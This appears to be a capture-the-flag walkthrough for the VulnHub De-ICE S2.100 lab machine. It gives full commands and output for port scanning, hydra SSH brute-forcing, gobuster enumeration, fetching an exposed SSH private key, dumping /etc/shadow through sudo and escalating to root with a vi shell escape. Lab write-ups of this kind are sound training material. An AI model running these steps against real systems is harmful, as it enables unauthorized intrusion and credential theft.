# __De-ICE_S2.100__
[Link to vulnhub](https://www.vulnhub.com/entry/de-ice-s2100,13/)

## Reconnaissance
```
nmap -sS -O 192.168.2.0/24

Nmap scan report for 192.168.2.100
Host is up (0.00035s latency).
Not shown: 992 filtered ports
PORT    STATE  SERVICE
20/tcp  closed ftp-data
21/tcp  open   ftp
22/tcp  open   ssh
25/tcp  open   smtp
80/tcp  open   http
110/tcp open   pop3
143/tcp open   imap
443/tcp closed https
MAC Address: 00:0C:29:A2:AA:41 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.13 - 2.6.32
Network Distance: 1 hop

Nmap scan report for 192.168.2.101
Host is up (0.00033s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:A2:AA:41 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.13 - 2.6.32, Linux 2.6.16, Linux 2.6.16 - 2.6.25
Network Distance: 1 hop
```

## __Enumeration__
Nmap vulnerability scan
```
nmap -sV -A --script vuln -p- -v 192.168.2.100-101
Nmap scan report for 192.168.2.100
Host is up (0.00058s latency).
Not shown: 65527 filtered ports
PORT    STATE  SERVICE  VERSION
20/tcp  closed ftp-data
21/tcp  open   ftp      vsftpd 2.0.4
|_sslv2-drown: 
22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
|_sslv2-drown: 
80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /info.php: Possible information file
|_  /icons/: Potentially interesting directory w/ listing on 'apache/2.0.55 (unix) php/5.1.2'
|_http-server-header: Apache/2.0.55 (Unix) PHP/5.1.2
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
110/tcp open   pop3     Openwall popa3d
|_sslv2-drown: 
143/tcp open   imap     UW imapd 2004.357
|_sslv2-drown: 
443/tcp closed https
MAC Address: 00:0C:29:A2:AA:41 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.13 - 2.6.32
Uptime guess: 0.008 days (since Sun Dec 31 19:46:55 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=203 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: slax.example.net; OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms 192.168.2.100

Nmap scan report for 192.168.2.101
Host is up (0.00038s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /icons/: Potentially interesting directory w/ listing on 'apache/2.0.55 (unix) php/5.1.2'
|_http-server-header: Apache/2.0.55 (Unix) PHP/5.1.2
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  OSVDB:74721
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       http://osvdb.org/74721
|       http://seclists.org/fulldisclosure/2011/Aug/175
|       http://nessus.org/plugins/index.php?view=single&id=55976
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
MAC Address: 00:0C:29:A2:AA:41 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.13 - 2.6.32, Linux 2.6.16, Linux 2.6.16 - 2.6.25
Uptime guess: 0.008 days (since Sun Dec 31 19:46:52 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=202 (Good luck!)
IP ID Sequence Generation: All zeros
```

* Emails
```
pickwick@herot.net
winkle@herot.net
snodgrass@herot.net
tupman@herot.net
weller@herot.net
tweller@herot.net
havisham@herot.net
magwitch@herot.net
pirrip@herot.net
nickleby@herot.net
rnickleby@herot.net
noggs@herot.net
squeers@herot.net
pinch@herot.net
tapley@herot.net
gamp@herot.net
marley@herot.net
scrooge@herot.net
cratchit@herot.net
sikes@herot.net
dawkins@herot.net

--- lists.txt
pickwick
winkle
snodgrass
tupman
weller
tweller
havisham
magwitch
pirrip
nickleby
rnickleby
noggs
squeers
pinch
tapley
gamp
marley
scrooge
cratchit
sikes
dawkins
```


* hydra
```
root@BOEING:~# hydra -s 22 -v -V -L lists.txt -P lists.txt -e n -t 5 -w 30  ssh://192.168.2.100

<< No luck >>

root@BOEING:~# hydra -s 22 -v -V -L lists.txt -P /usr/share/wordlists/rockyou.txt -e n -t 5 -w 30  ssh://192.168.2.100
```

* dirbuster
```
root@BOEING:~# gobuster -w /usr/share/dirb/wordlists/big.txt -u http://192.168.2.101/           

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.2.101/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/home (Status: 301)
/~root (Status: 301)
```

Then I tried for other users
```
root@BOEING:# cat users.txt 
~root
~pickwick
~winkle
~snodgrass
~tupman
~weller
~tweller
~havisham
~magwitch
~pirrip
~nickleby
~rnickleby
~noggs
~squeers
~pinch
~tapley
~gamp
~marley
~scrooge
~cratchit
~sikes
~dawkins

root@BOEING:# gobuster -w users.txt -u http://192.168.2.101/
Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.2.101/
[+] Threads      : 10
[+] Wordlist     : users.txt
[+] Status codes : 307,200,204,301,302
=====================================================
/~pirrip (Status: 301)
/~havisham (Status: 301)
/~magwitch (Status: 301)
/~root (Status: 301)
=====================================================
```

Tried to guess URI from that locations
```
root@BOEING:# gobuster -w /usr/share/dirb/wordlists/big.txt -u http://192.168.2.101/~pirrip 

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.2.101/~pirrip/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/.ssh (Status: 301)
=====================================================
```


## __Exploit__
Got luck now, this location stored private key to login to that host
```
root@BOEING:# cd /root/.ssh/
root@BOEING:# wget http://192.168.2.101/~pirrip/.ssh/id_rsa
--2018-01-01 12:18:09--  http://192.168.2.101/~pirrip/.ssh/id_rsa
Connecting to 192.168.2.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1675 (1.6K) [text/plain]
Saving to: ‘id_rsa’

id_rsa                                 100%[==========================================================================>]   1.64K  --.-KB/s    in 0s      

2018-01-01 12:18:09 (197 MB/s) - ‘id_rsa’ saved [1675/1675]

root@BOEING:# wget http://192.168.2.101/~pirrip/.ssh/id_rsa.pub
--2018-01-01 12:18:16--  http://192.168.2.101/~pirrip/.ssh/id_rsa.pub
Connecting to 192.168.2.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 393 [text/plain]
Saving to: ‘id_rsa.pub’

id_rsa.pub                             100%[==========================================================================>]     393  --.-KB/s    in 0s      

2018-01-01 12:18:16 (38.7 MB/s) - ‘id_rsa.pub’ saved [393/393]

root@BOEING:# chmod 600 id_rsa*
root@BOEING:# ls -al
total 32
drwx------  2 root root  4096 Jan  1 12:18 .
drwxr-xr-x 39 root root  4096 Dec 31 20:19 ..
-rw-------  1 root root  1675 Jan  6  2008 id_rsa
-rw-------  1 root root   393 Jan  6  2008 id_rsa.pub
-rw-r--r--  1 root root 15152 Jan  1 12:16 known_hosts
root@BOEING:# 

root@BOEING:# ssh pirrip@192.168.2.100
Linux 2.6.16.
pirrip@slax:~$ id
uid=1000(pirrip) gid=10(wheel) groups=10(wheel)
```

## __Privilege escalation__
* Check kernel
```
pirrip@slax:~$ uname -a
Linux slax 2.6.16 #95 Wed May 17 10:16:21 GMT 2006 i686 i686 i386 GNU/Linux
```

* Check ID
```
pirrip@slax:~$ id
uid=1000(pirrip) gid=10(wheel) groups=10(wheel)
```
The user is in wheel group so if I could extract his password I could get root by SU command.

* Check /etc/passwd
```
pirrip@slax:~$ cat /etc/passwd
root:x:0:0::/root:/bin/bash
bin:x:1:1:bin:/bin:
daemon:x:2:2:daemon:/sbin:
adm:x:3:4:adm:/var/log:
lp:x:4:7:lp:/var/spool/lpd:
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/:
news:x:9:13:news:/usr/lib/news:
uucp:x:10:14:uucp:/var/spool/uucppublic:
operator:x:11:0:operator:/root:/bin/bash
games:x:12:100:games:/usr/games:
ftp:x:14:50::/home/ftp:
smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
rpc:x:32:32:RPC portmap user:/:/bin/false
sshd:x:33:33:sshd:/:
gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
pop:x:90:90:POP:/:
nobody:x:99:99:nobody:/:
pirrip:x:1000:10:Philip Pirrip:/home/pirrip:/bin/bash
magwitch:x:1001:100:Abel Magwitch:/home/magwitch:/bin/bash
havisham:x:1002:100:Estella Havisham:/home/havisham:/bin/bash
```

* check his mail
```
pirrip@slax:/var/mail$ cat pirrip 
...snip...
E-Mail: pirrip@slax.example.net
Password: 0l1v3rTw1st
...snip...
```

* check what I could run as root via SUDO
```
pirrip@slax:/var/mail$ sudo -l
User pirrip may run the following commands on this host:
    (root) /usr/bin/more
    (root) /usr/bin/tail
    (root) /usr/bin/vi
    (root) /usr/bin/cat ALL
```

* Check /etc/shadow
```
pirrip@slax:/var/mail$ sudo more /etc/shadow
root:$1$/Ta1Q0lT$CSY9sjWR33Re2h5ohV4MX/:13882:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
adm:*:9797:0:::::
lp:*:9797:0:::::
sync:*:9797:0:::::
shutdown:*:9797:0:::::
halt:*:9797:0:::::
mail:*:9797:0:::::
news:*:9797:0:::::
uucp:*:9797:0:::::
operator:*:9797:0:::::
games:*:9797:0:::::
ftp:*:9797:0:::::
smmsp:*:9797:0:::::
mysql:*:9797:0:::::
rpc:*:9797:0:::::
sshd:*:9797:0:::::
gdm:*:9797:0:::::
pop:*:9797:0:::::
nobody:*:9797:0:::::
pirrip:$1$KEj04HbT$ZTn.iEtQHcLQc6MjrG/Ig/:13882:0:99999:7:::
magwitch:$1$qG7/dIbT$HtTD946DE3ITkbrCINQvJ0:13882:0:99999:7:::
havisham:$1$qbY1hmdT$sVZn89wKvmLn0wP2JnZay1:13882:0:99999:7:::
```

It's possible to escape VI shell to execute command as root:
```
vi /etc/shadow

...snipped...

:!command id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
```

or

```
vi /etc/shadow

...snipped...

:!bash
bash-3.1# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
```